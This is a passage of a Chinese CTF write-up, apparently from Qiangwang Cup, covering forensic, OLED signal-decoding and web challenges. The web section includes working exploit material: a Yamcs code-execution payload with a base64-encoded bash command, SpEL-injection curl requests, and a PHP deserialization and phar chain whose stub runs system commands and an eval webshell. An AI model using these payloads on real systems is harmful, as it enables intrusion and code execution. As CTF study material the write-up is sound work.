+        print(f"[重复轨合成] {comb_path}  ({len(combined)/SAMPLE_RATE:.2f}s)")
+        if names:
+            print("  顺序："); [print(f"   - {n}") for n in names]
+    else:
+        print("[重复轨合成] 无可用音频，跳过。")
+
+    # ======== 生成排查报告 ========
+    report = []
+    report.append(f"# 非RTP/非PCMU 报告")
+    report.append(f"生成时间: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
+    report.append(f"PCAP文件: {os.path.abspath(PCAP_PATH)}")
+    report.append("")
+    report.append(f"总帧数: {total_packets}")
+    report.append(f"IPv4帧数: {total_ipv4}")
+    report.append(f"UDP报文数: {total_udp}")
+    report.append(f"RTP报文数: {total_rtp}")
+    report.append(f"RTP(PT=0, PCMU)报文数: {total_rtp_pcmu}")
+    report.append("")
+
+    if non_ipv4_counts:
+        report.append("## 非IPv4以太帧 (按EtherType统计)")
+        for et, cnt in sorted(non_ipv4_counts.items(), key=lambda x: x[0]):
+            report.append(f"- EtherType={et}: {cnt}")
+        report.append("")
+    if non_udp_counts:
+        report.append("## 非UDP的IPv4报文 (按IP协议号统计)")
+        for proto, cnt in sorted(non_udp_counts.items(), key=lambda x: int(x[0])):
+            report.append(f"- IP Proto={proto}: {cnt}")
+        report.append("")
+    if udp_non_rtp:
+        report.append("## UDP但非RTP的流 (按端口对统计)")
+        for (sp, dp), cnt in sorted(udp_non_rtp.items()):
+            prefix_hex = (examples_udp_non_rtp.get((sp, dp), "") or "")
+            report.append(f"- {sp} -> {dp}: {cnt} 报文，样例前缀(<=16B)={prefix_hex}")
+        report.append("")
+    if rtp_non_pcmu:
+        report.append("## RTP但非PCMU的流 (按 src_port, dst_port, PT 统计)")
+        agg = defaultdict(int)
+        for (sp, dp, ssrc, pt), cnt in rtp_non_pcmu.items():
+            agg[(sp, dp, pt)] += cnt
+        for (sp, dp, pt), total in sorted(agg.items()):
+            report.append(f"- {sp} -> {dp}, PT={pt}: {total} 报文")
+        report.append("")
+    if not (non_ipv4_counts or non_udp_counts or udp_non_rtp or rtp_non_pcmu):
+        report.append("没有发现异常：全部可疑类别均为空（或样本极少）。")
+
+    write_report(report)
+    print(f"\n[+] 排查报告：{REPORT_PATH}")
+
+if __name__ == "__main__":
+    main()
+```
+
+提取完后用飞书妙记转录，可以看到里面有两串数字，而且很明显数字都不超过8，一眼八进制
+
+![img](5.png)
+
+![img](6.png)
+
+用厨子转一下八进制就好了，这里要手动拆，不然他识别不到
+
+![img](7.png)
+
+刚刚好拿到32位的hex值，尝试解压加密压缩包发现密码对了
+
+![img](8.png)
+
+老样子妙记转录音频文字，可以看到有些信息，什么廿四，辰时正过三刻，双里湖西岸南山茶铺，看这个通话看着其实就很间谍那味（）
+
+但是这里太谜语了，一直没确定具体的时间，只有地点是确定的
+
+![img](9.png)
+
+直到后面上了hint，确定要去寻找历史事件（其实有一点猜想，但不确定），音频中提到的双里湖，通过简单社工发现了一个叫双鲤湖的地方，位于福建省金门县，通过大量调查，发现那曾发生过金门战役
+
+![img](10.png)
+
+![img](11.png)
+
+那么时间就确定了是1949年10月24日（一开始以为是25不对，改24对了），然后时分就是8点45分，对应辰时正三刻，地点就是双鲤湖西岸南山茶铺
+
+```Python
+md5(1949年10月24日8时45分于双鲤湖西岸南山茶铺)
+```
+
+## legacyOLED
+
+（这题凭什么烂，我感觉好难）
+
+附件是一个sr文件，经常打国外赛的都知道，这是什么逻辑分析仪的文件，可以用sigrok的工具打开，下个pulseview打开，发现里面有蜜汁波形
+
+![img](12.png)
+
+后面队友给我说可能借鉴了这个文章：https://github.com/bobby-tables2/CTF-Archive/tree/87dcb7af1c64705315d6878a7178accf316fe606/CTFSG%202022/SIGINT/Writeup
+
+我简单看了看，发现太像了，遂继续攻破，首先根据题目的OLED和波形的情况，推断这个OLED显示屏的信号数据，一般他的通信协议是I2C，所以可以用I2C对其进行解码，可以发现它传了不少数据的
+
+![img](13.png)
+
+我将数据提取了出来（右键可以导出），然后利用参考的文章的exp跑，发现不行，完全对不上，遂深入研究了OLED和I2C通信的原理
+
+https://blog.csdn.net/weixin_63726869/article/details/133132435
+
+https://zhuanlan.zhihu.com/p/14257150571
+
+通过深入学习上面的两个文章，我确定了，当设备进行地址写入后，传入的第一个数据为控制字节，如果是00则代表传入了命令，40则代表发送给GRAM，然后用于画面打印的（大概就这意思）
+
+![img](14.png)
+
+这整段波形中，前面一长串基本是没用的，主要从后一段开始分析，我们可以看到这里断开传入了四次数据，一开始00控制字节，执行了20命令，参数为01，20代表其进行寻址模式调整，参数为01时寻址模式为垂直寻址，00则为水平寻址，后面会出现多次交替，然后是22命令和21命令，分别对应起始/终止页和列，也就是说从哪里开始画起，再往后就是传入40控制字节，开始显示，往后每段都有类似的情况，需要将他们逐一提取然后在参考文章exp的基础上，通过拷打ai问出了一个升级版的脚本
+
+![img](15.png)
+
+```Markdown
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+[01 21 22 3B 22 03 05]: 00 00 00 00 00 00 C0 00 00 E0 01 00 F8 07 00 FE 1F 00 FF 1F 00 FF 7F 00 FF FF 01 FF FF 07 FF FF 0F FF FF 1F FF FF 7F FF FF FF 3F FE FF 0F FC FF 03 F0 FF E0 E0 FF F8 C3 FF FE 07 FF FF 1F FC FF 3F F8 FF 7F F0 FF 3F F0 FF 1F FC FF 0F FF
+[00 21 2E 53 22 06 06]: 00 00 03 07 0F 0F 0F 0F 0F 0F 0F 0F 0F 0F 0F 0F 0F 0F 03 00 00 08 0E 0F 0F 0F 0F 0F 0F 0F 0F 0F 07 03 00 00 00 00
+[01 21 00 32 22 00 01]: 00 00 47 00 7E 00 70 00 06 00 06 00 63 00 33 00 00 00 7F 00 6F 00 10 00 33 00 7F 00 3B 00 75 00 00 00 19 00 6F 00 20 00 19 00 39 00 21 00 10 00 00 00 7F 00 5F 00 66 00 22 00 21 00 65 00 3F 00 00 00 4F 00 7F 00 35 00 02 00 5E 00 0B 00 7E 00 00 00 57 00 7F 00 32 00 00 00 12 80 24 E0 47 F0 00 FC 7F FF DF FF
+[01 21 30 56 22 02 04]: FF 3F FE FF 0F FC FF 03 F0 FF E0 E0 3F F8 C3 1F FE 07 07 FF 1F C1 FF 3F E0 FF 7F F0 FF 3F FC FF 1F FF FF 0F FF FF 83 FF FF E0 FF 3F F0 FF 1F FC FF 07 FE FF 81 FF 7F E0 FF 1F F8 FF 1F FC FF 07 FF FF C1 FF FF C1 FF FF 83 FF 3F 0F FE 1F 1F FC 0F 3F F0 C3 FF C0 E0 FF 03 F8 FF 07 FE FF 1F FF FF FF FF FF FF FF FF FF FF FE FF FF F8 FF FF F0 FF FF E0 FF 7F
+[00 21 30 55 22 00 03]: 00 7F DF 83 C8 D1 A6 BC 80 ED FF B9 60 75 18 3D 00 C7 FF C4 D3 91 84 F6 80 9F EF 8C 92 92 16 1D 00 4B 7F 59 00 19 FC FF FF FF FF FF FF FF 7F 3F 0F 03 C0 E0 F8 FE FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FC F0 E0 80 00 00 00 FF FF FF FF 3F 1F 07 C1 E0 F0 FC FF FF FF FF FF FF FF 7F 1F 1F 07 C1 C1 83 0F 1F 3F FF FF FF FF FF FF FF FE F8 F0 3F 0F 03 E0 F8 FE FF FF FF FF FF FF FF FF 3F 1F 07 81 E0 F8 FC FF FF FF FF FE FC F0 C0 03 07 1F FF FF FF FF FF FF
+[01 21 33 59 22 05 07]: FF 0F 00 FF 0F 00 FF 0F 00 FC 0F 00 F8 0F 00 F0 0F 00 F0 0F 00 FC 0F 00 FF 0F 00 FF 0F 00 FF 0F 00 FF 0F 00 FF 0F 00 FF 03 00 FF 00 00 7F 00 00 3F 08 00 0F 0E 00 87 0F 00 C3 0F 00 F0 0F 00 F8 0F 00 FC 0F 00 FF 0F 00 FF 0F 00 FF 0F 00 FF 0F 00 FF 07 00 FF 03 00 FF 00 00 3F 00 00 1F 00 00 0F 00 00 07 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+[00 21 4F 7F 22 00 04]: 1D 00 4B 7F 59 00 19 4A 5E 00 6B 5F 22 71 50 0A 71 00 7B 6F 18 29 23 39 7B 04 6B 77 78 05 33 49 30 04 5F 6B 45 02 58 01 0B 04 36 7B 08 14 18 66 00 FC F0 E0 80 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 FF FF FF FF FE F8 F0 E0 80 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 1F FF FF FF FF FF FF FF FF FE FC F0 60 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 FF FF FF FF FF FF FF 7F 1F 0F 07 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+[00 21 24 35 22 00 02]: 02 5E 0B 7E 00 57 7F 32 00 12 24 47 00 7F DF 83 C8 D1 00 00 00 00 00 00 00 00 00 80 E0 F0 FC FF FF FF FF FF 00 00 00 00 80 E0 E0 F8 FE FF FF FF FF FF FF FF 3F 1F
+[01 21 00 7F 22 00 00]: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+```
+
+![img](16.png)
+
+```Python
+import binascii
+import re
+
+# OLED显示参数
+WIDTH = 128  # 列数
+PAGES = 8  # 页数（每页8个像素高）
+HEIGHT = PAGES * 8  # 总高度64像素
+
+# 创建二维像素数组
+pixels = [['_' for _ in range(WIDTH)] for _ in range(HEIGHT)]
+
+
+def draw_page_addressing_mode(hex_data):
+    """页寻址模式：解析包含10/00指令的数据流"""
+    global pixels
+
+    current_page = 0
+    current_col = 0
+    col_start = 0
+    col_end = 127
+
+    i = 0
+    total_bytes = 0
+    data_count = 0
+
+    while i < len(hex_data):
+        byte_val = int(hex_data[i], 16)
+
+        # 检查是否是列地址低位设置指令 (00H~0FH)
+        if 0x00 <= byte_val <= 0x0F:
+            col_low = byte_val & 0x0F
+            current_col = (current_col & 0xF0) | col_low
+            print(f"  设置列地址低位: {col_low:X}H, 当前列={current_col}")
+            i += 1
+            continue
+
+        # 检查是否是列地址高位设置指令 (10H~1FH)
+        if 0x10 <= byte_val <= 0x1F:
+            col_high = (byte_val & 0x0F) << 4
+            current_col = (current_col & 0x0F) | col_high
+            print(f"  设置列地址高位: {(byte_val & 0x0F):X}H, 当前列={current_col}")
+            i += 1
+            continue
+
+        # 检查是否是页地址设置指令 (B0H~B7H)
+        if 0xB0 <= byte_val <= 0xB7:
+            current_page = byte_val & 0x07
+            print(f"  设置页地址: {current_page}")
+            i += 1
+            continue
+
+        # 否则是数据字节
+        byte_str = f'{byte_val:0>8b}'
+
+        # 绘制该字节（一列中一页的8个像素）
+        if current_col < WIDTH:  # 只在有效范围内绘制
+            for bit in range(8):
+                row = current_page * 8 + bit
+                if row < HEIGHT:
+                    if byte_str[7 - bit] == '1':
+                        pixels[row][current_col] = '#'
+
+        # 列地址自动递增，限制在0-127范围内
+        current_col += 1
+        if current_col > 127:  # 超过127就回到起始列
+            current_col = col_start
+            # 注意：页地址不会自动改变
+
+        data_count += 1
+        i += 1
+
+    return data_count
+
+
+def draw_horizontal_mode(hex_data, start_col, end_col, start_page, end_page):
+    """水平地址模式：先写完一行的所有列，再到下一行"""
+    global pixels
+
+    bin_data = []
+    for ele in hex_data:
+        bin_data.append(f'{int(ele, 16):0>8b}')
+
+    current_col = start_col
+    current_page = start_page
+
+    for byte_str in bin_data:
+        if current_page > end_page:
+            break
+
+        for bit in range(8):
+            row = current_page * 8 + bit
+            if row < HEIGHT and current_col < WIDTH:
+                if byte_str[7 - bit] == '1':
+                    pixels[row][current_col] = '#'
+
+        current_col += 1
+        if current_col > end_col:
+            current_col = start_col
+            current_page += 1
+            if current_page > end_page:
+                break
+
+    return len(bin_data)
+
+
+def draw_vertical_mode(hex_data, start_col, end_col, start_page, end_page):
+    """垂直地址模式：先写完一列的所有页，再到下一列"""
+    global pixels
+
+    bin_data = []
+    for ele in hex_data:
+        bin_data.append(f'{int(ele, 16):0>8b}')
+
+    current_col = start_col
+    current_page = start_page
+
+    for byte_str in bin_data:
+        if current_col > end_col:
+            break
+
+        for bit in range(8):
+            row = current_page * 8 + bit
+            if row < HEIGHT and current_col < WIDTH:
+                if byte_str[7 - bit] == '1':
+                    pixels[row][current_col] = '#'
+
+        current_page += 1
+        if current_page > end_page:
+            current_page = start_page
+            current_col += 1
+            if current_col > end_col:
+                break
+
+    return len(bin_data)
+
+
+# 读取文件
+with open("pixel.txt", "r") as f:
+    lines = f.readlines()
+
+# 第一行：页寻址模式（默认）
+print("=" * 60)
+print("第一阶段：页寻址模式")
+print("=" * 60)
+
+if lines:
+    first_line = lines[0].strip()
+    if first_line:
+        hex_data = first_line.split()
+        print(f"处理页寻址模式数据，共 {len(hex_data)} 字节")
+        bytes_used = draw_page_addressing_mode(hex_data)
+        print(f"绘制了 {bytes_used} 个数据字节\n")
+
+# 后续行：动态模式（带指令）
+print("=" * 60)
+print("第二阶段：动态地址模式")
+print("=" * 60)
+
+line_num = 1
+for line in lines[1:]:
+    line_num += 1
+    line = line.strip()
+    if not line:
+        continue
+
+    # 解析格式: [yy 21 xx xx 22 xx xx]:
+    match = re.match(
+        r'\[([0-9A-Fa-f]{2})\s+21\s+([0-9A-Fa-f]{2})\s+([0-9A-Fa-f]{2})\s+22\s+([0-9A-Fa-f]{2})\s+([0-9A-Fa-f]{2})\][：:]\s*(.*)',
+        line)
+
+    if not match:
+        print(f"第 {line_num} 行格式不正确，跳过: {line[:50]}...")
+        continue
+
+    mode_byte = match.group(1)
+    start_col = int(match.group(2), 16)
+    end_col = int(match.group(3), 16)
+    start_page = int(match.group(4), 16)
+    end_page = int(match.group(5), 16)
+    hex_data_str = match.group(6).strip()
+
+    hex_data = hex_data_str.split()
+
+    if mode_byte == "00":
+        mode = "水平"
+        bytes_used = draw_horizontal_mode(hex_data, start_col, end_col, start_page, end_page)
+    elif mode_byte == "01":
+        mode = "垂直"
+        bytes_used = draw_vertical_mode(hex_data, start_col, end_col, start_page, end_page)
+    else:
+        print(f"第 {line_num} 行未知模式: {mode_byte}，跳过")
+        continue
+
+    print(
+        f"第 {line_num} 行 | {mode}模式 | 列[{start_col}:{end_col}] 页[{start_page}:{end_page}] | 数据: {len(hex_data)} 字节")
+
+# 输出图像
+print("\n" + "=" * 60)
+print("最终OLED图像输出:")
+print("=" * 60 + "\n")
+print(f"图像尺寸: {WIDTH}列 x {HEIGHT}行")
+print(f"实际像素数组: {len(pixels)}行 x {len(pixels[0])}列\n")
+
+for row in pixels:
+    for col_idx in range(min(WIDTH, len(row))):  # 只输出WIDTH列
+        print(row[col_idx], end=' ')
+    print()
+
+# 保存为文本文件
+with open("oled_output.txt", "w") as f:
+    for row in pixels:
+        for col_idx in range(min(WIDTH, len(row))):  # 只输出WIDTH列
+            f.write(row[col_idx] + ' ')
+        f.write('\n')
+
+print("\n图像已保存到 oled_output.txt")
+```
+
+最后终于成功了，画出了一个强网杯的logo，上面乱乱的看不出是什么，以为是我脚本错了，后面发现是将_#转01然后解二进制就可以了
+
+![img](17.png)
+
+![img](18.png)
+
+## Secured Personal Vault
+
+依旧一血，而且坚不可摧（）
+
+如果我说我又非了你信吗（）
+
+依旧内存取证，但是把早上的非预期修了，爆搜搜不到，分析一下发现桌面有个apersonalvault.exe（早上的取证做过也能知道）
+
+![img](19.png)
+
+提出来丢给逆向手逆向了，他们说要找密文，exe里自带了解密什么的，但是生成的mailslot文件提取不出来，拿不到，没招了
+
+真没招吗
+
+并非
+
+我做完OLED寻思看看他的窗口管理器内存转储，也就是dwm.exe的内存转储（参考了ycb我出的内存取证，想着试试），遂提取了一波，用马处的lovelymem luxe提取内存转储，然后用lovelypixelweaver进行爆看
+
+由于不确定分辨率，所以我手动爆了一下，最后发现是1279这个宽度可以正常看到窗口信息，然后我就滑了滑，没想到啊，真的有出题人在加密flag时的窗口画面，但是有点花，不过不影响我通过强大的视力再加上一点点小小的英语语法功底和毅力，将他盯出来了，flag最后为
+
+```Python
+flag{Making_challenge_is_hard_manage_secure_vault_is_more_difficult}
+```
+
+![img](20.png)
+
+![img](21.png)
+
+![img](22.png)
+
+至此该系列顺利完成，双非这块（）
+
+# Web
+
+## Yamcs
+
+```Dockerfile
+FROM maven:3.9.9-eclipse-temurin-17
+
+WORKDIR /build
+
+RUN apt-get update && apt-get install -y git && \
+    git clone https://github.com/yamcs/quickstart.git
+
+WORKDIR /build/quickstart
+
+RUN chmod +x mvnw
+RUN ./mvnw compile
+
+RUN apt-get update && \
+    apt-get install -y python3 python3-pip && \
+    apt-get clean
+
+RUN ./mvnw dependency:go-offline
+
+RUN echo FLAG>/flag
+EXPOSE 8090
+
+CMD bash -c '\
+  nohup python3 simulator.py >/dev/null 2>&1 & \
+  ./mvnw yamcs:run'
+```
+
+直接本地 clone 项目，很小，发现
+
+![img](23.png)
+
+发现可控字符串，clone 完整的后端大项目下来搜索这个方法的实现，结果全局搜索搜不出来，从数据流路由找出 web 路由，
+
+```YAML
+/algorithms/[InstanceName]/[AlgorithmName]/-/summary?c=[InstanceName]__[ProcessorName]
+
+/algorithms/myproject/copySunsensor/-/summary?c=myproject__realtime
+```
+
+![img](24.png)
+
+找到能够 RCE 的地方，但是远程不出网，jdk17 内存马写不来
+
+![img](25.png)
+
+起个 docker 找到静态目录
+
+![img](26.png)
+
+直接写入
+
+![img](27.png)
+
+```Java
+try {
+    Runtime.getRuntime().exec("bash -c {echo,dGFjIC9mbGFnID4gL2J1aWxkL3F1aWNrc3RhcnQvdGFyZ2V0L3lhbWNzL2NhY2hlL3lhbWNzLXdlYi8xLnR4dA==}|{base64,-d}|{bash,-i}");
+} catch (java.io.IOException e) {
+    throw new RuntimeException(e);
+}
+```
+
+## bbjv
+
+```Java
+package com.ctf.gateway.controller;
+
+import com.ctf.gateway.service.EvaluationService;
+import java.io.BufferedReader;
+import java.io.File;
+import java.io.FileNotFoundException;
+import java.io.FileReader;
+import java.io.IOException;
+import org.springframework.web.bind.annotation.GetMapping;
+import org.springframework.web.bind.annotation.RequestParam;
+import org.springframework.web.bind.annotation.RestController;
+
+@RestController
+/* loaded from: app.jar:BOOT-INF/classes/com/ctf/gateway/controller/GatewayController.class */
+public class GatewayController {
+    private final EvaluationService evaluationService;
+
+    public GatewayController(EvaluationService evaluationService) {
+        this.evaluationService = evaluationService;
+    }
+
+    @GetMapping({"/check"})
+    public String checkRule(@RequestParam String rule) throws FileNotFoundException {
+        String result = this.evaluationService.evaluate(rule);
+        File flagFile = new File(System.getProperty("user.home"), "flag.txt");
+        if (flagFile.exists()) {
+            try {
+                BufferedReader br = new BufferedReader(new FileReader(flagFile));
+                try {
+                    String content = br.readLine();
+                    result = result + "<br><b>�� Flag:</b> " + content;
+                    br.close();
+                } finally {
+                }
+            } catch (IOException e) {
+                throw new RuntimeException(e);
+            }
+        }
+        return result;
+    }
+}
+```
+
+找到路由，只要我能把 user.home 设置为`/tmp`即可读取，SpEL表达式注入
+
+```Python
+curl -s -k -G "https://eci-2zeivhucjzij0z5z6p1n.cloudeci1.ichunqiu.com:8080/check" --data-urlencode "rule=#{T(java.lang.System).setProperty('user.home','/tmp')}"
+C:\Users\a5rz_>curl -s -k -G "https://eci-2zeivhucjzij0z5z6p1n.cloudeci1.ichunqiu.com:8080/check" --data-urlencode "rule=#{T(java.lang.System).setProperty('user.home','/tmp')}"
+Error: EL1005E: Type cannot be found 'java.lang.System'
+
+## 换个函数
+curl -s -k -G "https://eci-2zeivhucjzij0z5z6p1n.cloudeci1.ichunqiu.com:8080/check" --data-urlencode "rule=#{#systemProperties['user.home']='/tmp'}"
+```
+
+## ezphp
+
+base64解码后（添加了一些调试信息）
+
+```PHP
+<?php
+function generateRandomString($length = 8) {
+    $characters = 'abcdefghijklmnopqrstuvwxyz';
+    $randomString = '';
+    for ($i = 0; $i < $length; $i++) {
+        $r = rand(0, strlen($characters) - 1);
+        $randomString .= $characters[$r];
+    }
+    return $randomString;
+}
+
+date_default_timezone_set('Asia/Shanghai');
+
+class test {
+    public $readflag;
+    public $f;
+    public $key;
+
+    public function __construct() {
+        echo "constructed.\n";
+        $this->readflag = new class {
+            public function __construct() {
+                if (isset($_FILES['file']) && $_FILES['file']['error'] == 0) {
+                    $time = date('Hi');
+                    $filename = $GLOBALS['filename'];
+                    $seed = $time . intval($filename);
+                    echo "Seed = ". $seed . "\n";
+                    mt_srand($seed);
+
+                    $uploadDir = 'uploads/';
+                    $files = glob($uploadDir . '*');
+                    foreach ($files as $file) {
+                        if (is_file($file)) unlink($file);
+                    }
+
+                    $randomStr = generateRandomString(8);
+                    $newFilename = $time . '.' . $randomStr . '.' . 'jpg';
+                    $GLOBALS['file'] = $newFilename;
+
+                    $uploadedFile = $_FILES['file']['tmp_name'];
+                    $uploadPath = $uploadDir . $newFilename;
+
+                    echo $uploadedFile . "\n";
+                    echo $uploadPath . "\n";
+
+                    if (system("cp " . $uploadedFile . " " . $uploadPath)) {
+                        echo "success upload!\n";
+                    } else {
+                        echo "error\n";
+                    }
+                }
+            }
+
+            public function __wakeup() {
+                phpinfo();
+            }
+
+            public function readflag() {
+                function readflag() {
+                    echo "inner readflag executed.\n";
+                    if (isset($GLOBALS['file'])) {
+                        $file = $GLOBALS['file'];
+                        $file = basename($file);
+                        if (preg_match('/:\/\//', $file))
+                            die("error");
+
+                        $file_content = file_get_contents("uploads/" . $file);
+                        echo "Including " . $file . "\n";
+                        echo $file_content . "\n";
+
+                        if (preg_match('/<\?|\:\/\/|ph|\?\=/i', $file_content)) {
+                            die("Illegal content detected in the file.");
+                        }
+
+                        include("uploads/" . $file);
+                    }
+                }
+            }
+        };
+    }
+
+    public function __destruct() {
+        $func = $this->f;
+        $GLOBALS['filename'] = $this->readflag;
+
+        if ($this->key == 'class') {
+            new $func();
+        } else if ($this->key == 'func') {
+            $func();
+        } else {
+            echo "printfile.\n";
+        }
+    }
+}
+
+$ser = isset($_GET['land']) ? $_GET['land'] : 'O:4:"test":N';
+@unserialize($ser);
+
+// $name = $_GET['name'];
+// $name();
+```
+
+第一个点在于如何调用匿名类中的 `readflag` 函数，这是实现 `include` 的关键
+
+参考p牛博客：https://www.leavesongs.com/PENETRATION/php-challenge-2023-oct.html
+
+保存base64解码后的文件为 test.php，用同款插件分析
+
+![img](28.png)
+
+本地可以用 `%00readflag%2Fhome%2Fmingzu%2FCTF%2Fqwb%2Fezphp%2Ftest.php%3A59%241` 执行 `readflag`
+
+测试后可从远程环境报错得知 eval 之后的路径是 
+
+```
+/var/www/html/index.php(1) : eval()'d code
+```
+
+且行号是 1
+
+所以远程可以通过
+
+`%00readflag%2Fvar%2Fwww%2Fhtml%2Findex.php%281%29+%3A+eval%28%29%27d+code%3A1%241` 执行 readflag
+
+> $后面的数字会自增，但是没测出自增的规律，所以猜不到了就重启靶机
+
+然后是上传，以及上传后如何绕过 waf
+
+过滤了 `< : ph` 等等，很极限，所以打 gz 压缩后的 phar
+
+```PHP
+<?php
+$phar = new Phar('exp.phar');
+$phar->startBuffering();
+
+$stub = <<<'STUB'
+<?php
+    print 123;
+    system('cat /flag');
+    system('/readflag');
+    eval($_GET[1]);
+    __HALT_COMPILER();
+?>
+STUB;
+
+$phar->setStub($stub);
+$phar->addFromString('test.txt', 'test');
+$phar->stopBuffering();
+
+?>
+```
+
+![img](29.png)
+
+但是上传之后文件名会被重命名，include 去包含 .phar.gz 类文件必须有 phar 字符串的出现，测试后发现 `xxxx.pharxxxx.jpg` 在 include 时会被正确加载
+
+```PHP
+$time = date('Hi');
+$filename = $GLOBALS['filename'];
+$seed = $time . intval($filename);
+mt_srand($seed);
+$randomStr = generateRandomString(8);
+```
+
+所以我们需要控制文件名，由于种子可以预测文件名，所以可以爆破出小时分钟+某个数字的seed，让 generateRandomString 函数输出的前四个是phar
+
+然后将这个种子后缀，也就是我们想要的 $filename 的值，放到 test 实例的 readflag 成员变量中，使得反序列化时全局变量 filename 的值为这个数字
+
+此时触发 upload，则计算出的 file 变量的值就是xxxx.pharxxxx.png
+
+再去调用 readflag 函数，这样就可以触发 phar
+
+但是这种情况下在一分钟内有效，反序列化的 exp 如下
+
+```PHP
+<?php
+
+date_default_timezone_set('Asia/Shanghai');
+
+function generateRandomString($length = 8) {
+    $characters = 'abcdefghijklmnopqrstuvwxyz';
+    $randomString = '';
+    for ($i = 0; $i < $length; $i++) {
+        $r = rand(0, strlen($characters) - 1);
+        // echo $r . " ";
+        $randomString .= $characters[$r];
+    }
+    return $randomString;
+}
+
+function brute() {
+    $time = date('Hi');
+    for ($t=0; $t<=10000000; $t++)
+    {
+        $seed = $time . $t;
+        mt_srand($seed);
+        $x = generateRandomString(4);
+        // echo $seed . " " . $x . "\n";
+        if ($x == "phar") {
+            mt_srand($seed);
+            echo $t . " " . $seed . " " . generateRandomString() . "\n";
+            return $t;
+        }
+    }
+    return "";
+}
+
+class test{
+    public $readflag;
+    public $f;
+    public $key;
+}
+
+$absolute_path = "/var/www/html/index.php(1) : eval()'d code";
